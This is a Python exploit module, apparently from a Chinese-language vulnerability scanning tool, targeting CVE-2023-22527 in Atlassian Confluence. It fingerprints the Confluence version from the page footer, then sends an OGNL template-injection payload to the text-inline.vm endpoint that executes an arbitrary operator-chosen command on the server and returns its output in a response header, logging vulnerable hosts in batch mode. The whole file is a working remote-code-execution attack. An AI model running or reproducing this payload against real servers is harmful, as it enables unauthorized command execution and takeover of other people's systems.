#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3, requests
from bs4 import BeautifulSoup
from pub.com.output import OutPutFile
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Cve_2023_22527:
    def get_confluence_version(self,target):
        url = target
        try:
            response = requests.get(url, timeout=5, verify=self.ssl,proxies=self.proxy,headers=self.headers)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            version_span = soup.find('span', {'id': 'footer-build-information'})
            if version_span:
                confluence_version = version_span.text.strip()
                return confluence_version
        except requests.exceptions.RequestException as e:
            pass
        return None

    def check_exploitable_version(self,version):
        exploitable_versions = ['8.0.', '8.1.', '8.2.', '8.3.', '8.4.', '8.5.0', '8.5.1', '8.5.2', '8.5.3']
        for exploitable_version in exploitable_versions:
            if version.startswith(exploitable_version):
                return True
        return False

    def exploit(self, target, cmd):
        confluence_version = self.get_confluence_version(target)
        if confluence_version:
            if self.check_exploitable_version(confluence_version):
                url = f"{target}/template/aui/text-inline.vm"
                headers = {
                    "User-Agent": self.headers["User-Agent"],
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + cmd + "'}))"
                try:
                    response = requests.post(url, headers=headers, data=data, timeout=5, verify=self.ssl,proxies=self.proxy)
                    if (response.headers.get("X-Cmd-Response")):
                        if not self.batch:
                            OutPrintInfoSuc("Atlassian", f'存在Atlassian Confluence远程代码执行漏洞')
                            OutPrintInfo("Atlassian", url)
                            OutPrintInfoSuc("Atlassian", f'响应:\n{str(response.headers.get("X-Cmd-Response"))}')
                        else:
                            OutPrintInfoSuc("Atlassian", f'目标存在漏洞 {url}')
                            OutPutFile("atlassian_2023_22527.txt",f'目标存在漏洞: {url}')
                except Exception:
                    if not self.batch:
                        OutPrintInfo("Atlassian", f'不存在Atlassian Confluence远程代码执行漏洞')
            else:
                if not self.batch:
                    OutPrintInfo("Atlassian", f'不存在Atlassian Confluence远程代码执行漏洞')
        else:
            if not self.batch:
                OutPrintInfo("Atlassian", f'不存在Atlassian Confluence远程代码执行漏洞')
            
                   
                    

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        cmd = target["cmd"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Atlassian", '开始检测Atlassian Confluence远程代码执行漏洞...')

        self.exploit(url, cmd)
        if not self.batch:
            OutPrintInfo("Atlassian", 'Atlassian Confluence远程代码执行漏洞检测结束')
